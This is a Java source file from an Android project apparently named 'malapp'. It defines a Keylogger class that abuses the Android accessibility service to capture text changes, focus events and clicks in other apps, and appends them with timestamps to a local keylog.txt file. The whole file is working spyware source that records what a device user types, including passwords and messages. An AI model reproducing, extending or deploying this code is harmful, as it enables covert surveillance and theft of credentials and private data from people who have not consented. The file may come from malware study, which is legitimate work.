package com.posseggs.malapp;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.Locale;

public class Keylogger extends AccessibilityService {

    private static String TAG="Keylogger";
    private String fileName="keylog.txt";
    private boolean append = true; //Default true

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("dd.MM.yyyy, HH:mm:ss z", Locale.GERMAN);
        String time = df.format(Calendar.getInstance().getTime());
        
        FileIOHelper fileIO = new FileIOHelper();

        switch(event.getEventType())
        {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                Log.d(TAG,"Text changed!");
                String data = event.getText().toString();
                fileIO.saveToFile(fileName, (time + " TEXT: " + data),append);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                Log.d(TAG,"Text focused!");
                String data = event.getText().toString();
                //fileIO.saveToFile(fileName,(time + "|(FOCUSED)|" + data));
                fileIO.saveToFile(fileName, (time + " " + data ),append);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                Log.d(TAG,"Text clicked!");
                String data = event.getText().toString();
                fileIO.saveToFile(fileName, (time + " CLICKED: " + data),append);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
    }
}